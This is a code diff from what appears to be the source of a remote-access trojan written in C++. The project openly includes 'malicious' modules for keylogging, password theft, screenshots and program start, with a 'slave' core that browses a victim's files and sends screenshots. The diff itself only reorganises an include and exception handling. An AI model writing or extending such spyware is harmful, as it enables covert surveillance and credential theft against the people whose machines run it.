@@ -17,12 +17,12 @@ using namespace Blaspheme;
 #include <malicious/Screenshot.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
+#include <malicious/ProgramStart.hpp>
 using namespace Malicious;
 
 #include "RemoteControlFunctions.hpp"
 #include "SlaveCore.hpp"
 #include "SlaveAbstractFunction.hpp"
-#include "ProgramStart.hpp"
 
 #define SCREENSHOT_FILENAME "capture.jpg"
 
@@ -153,18 +153,10 @@ namespace Inhibition
                 }
             }
         }
-        catch(ListingError&)
+        catch(Common::Exception&)
         {
-            LOG << "Unable to list logic disks";
         }
-        catch(TransferException& e)
-        {
-            LOG << e.what();
-        }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         LOG << "BrowseFileTree : Ended";
     }
 
@@ -270,14 +262,10 @@ namespace Inhibition
             LOG << "Screenshot sent, deleting it";
 			remove(SCREENSHOT_FILENAME);
 		}
-        catch(TransferException& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         LOG << "SendScreenshot : Finished";
     }
 
